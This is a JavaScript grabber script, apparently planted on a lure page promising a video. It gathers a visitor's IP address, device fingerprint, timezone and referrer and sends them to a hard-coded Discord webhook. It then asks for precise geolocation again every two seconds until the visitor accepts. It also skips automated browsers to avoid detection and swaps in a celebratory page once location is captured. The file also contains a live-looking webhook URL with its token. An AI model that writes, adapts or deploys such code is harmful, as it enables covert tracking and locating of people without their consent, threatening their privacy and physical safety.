// ============================================
// CYBERX DATA COLLECTOR V3.0
// Toplanan: IP, Konum, Cihaz, Tarayıcı, Ekran, Dil, Zaman, Referrer
// Webhook: DÜZ URL (base64 yok)
// ============================================

// 1. WEBHOOK URL (DÜZ YAZI — KENDİ URL'Nİ YAZ)
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07';

// 2. VERİ GÖNDER
async function sendData(data) {
    try {
        const res = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: data })
        });
        if (res.ok) console.log('✅ Gönderildi');
        else console.log('❌ Hata: ' + res.status);
    } catch(e) {
        console.log('❌ Hata: ' + e.message);
    }
}

// 3. IP AL
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch(e) {
        return 'IP alınamadı';
    }
}

// 4. CİHAZ BİLGİSİ (ÇOK DETAYLI)
function getDeviceInfo() {
    return {
        // Tarayıcı bilgileri
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages.join(', '),
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        
        // Ekran bilgileri
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenColorDepth: screen.colorDepth,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        
        // Tarayıcı özellikleri
        hardwareConcurrency: navigator.hardwareConcurrency || 'bilinmiyor',
        deviceMemory: navigator.deviceMemory || 'bilinmiyor',
        maxTouchPoints: navigator.maxTouchPoints,
        
        // Zaman ve konum
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        currentTime: new Date().toLocaleString(),
        
        // Sayfa bilgileri
        url: window.location.href,
        referrer: document.referrer || 'doğrudan',
        title: document.title
    };
}

// 5. KONUM İSTE (REDDEDİNCE TEKRAR SOR)
function askLocation(ip, deviceInfo) {
    if (!navigator.geolocation) {
        sendData('⚠️ Tarayıcı konum desteklemiyor!');
        return;
    }
    
    let attempt = 0;
    
    function askAgain() {
        attempt++;
        navigator.geolocation.getCurrentPosition(
            // BAŞARILI
            (pos) => {
                const konum = `✅ KONUM ALINDI! (Deneme: ${attempt})
📍 Enlem: ${pos.coords.latitude}
📍 Boylam: ${pos.coords.longitude}
🎯 Doğruluk: ${pos.coords.accuracy} metre
🏔️ Rakım: ${pos.coords.altitude || 'bilinmiyor'}
🚀 Hız: ${pos.coords.speed || 'bilinmiyor'}
🌐 IP: ${ip}

📱 CİHAZ BİLGİLERİ:
${JSON.stringify(deviceInfo, null, 2)}`;

                sendData(konum);
                
                // BAŞARILI OLUNCA SAYFAYI DEĞİŞTİR
                document.body.innerHTML = `
                    <div style="text-align:center; padding:50px; font-family:Arial;">
                        <h1>🐱🎉 LUEG MAL!</h1>
                        <img src="https://cataas.com/cat/says/danke" width="300">
                        <p><strong>GUELTIG ISCHS!</strong> 😂😂😂</p>
                        <p>Jetzt chasch s Video luege!</p>
                    </div>
                `;
            },
            // REDDEDİLİNCE
            (error) => {
                let hataMesaji = '';
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        hataMesaji = '❌ KULLANICI REDDETTI! Tekrar soruluyor...';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        hataMesaji = '📡 Konum bulunamadi, tekrar deneniyor...';
                        break;
                    case error.TIMEOUT:
                        hataMesaji = '⏰ Zaman asimi, tekrar deneniyor...';
                        break;
                    default:
                        hataMesaji = '⚠️ Bilinmeyen hata, tekrar deneniyor...';
                }
                sendData(`${hataMesaji}\nIP: ${ip}\nDeneme: ${attempt}`);
                
                // 2 SANİYE SONRA TEKRAR SOR
                setTimeout(askAgain, 2000);
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    }
    
    askAgain();
}

// 6. ANA FONKSİYON
async function main() {
    // Bot kontrolü
    if (navigator.webdriver) {
        console.log('Bot tespit edildi, çalışmıyor.');
        return;
    }
    
    // IP al
    const ip = await getIP();
    
    // Cihaz bilgisi al
    const deviceInfo = getDeviceInfo();
    
    // İLK MESAJ: Ziyaretçi geldi
    const ilkMesaj = `🖥️🆕 YENİ ZİYARETÇİ GELDİ!
    
🌐 IP: ${ip}
📱 CİHAZ:
${JSON.stringify(deviceInfo, null, 2)}

⏰ Zaman: ${new Date().toLocaleString('tr-TR')}`;
    
    await sendData(ilkMesaj);
    
    // 1 saniye sonra konum iste
    setTimeout(() => askLocation(ip, deviceInfo), 1000);
}

// 7. BAŞLAT
main();
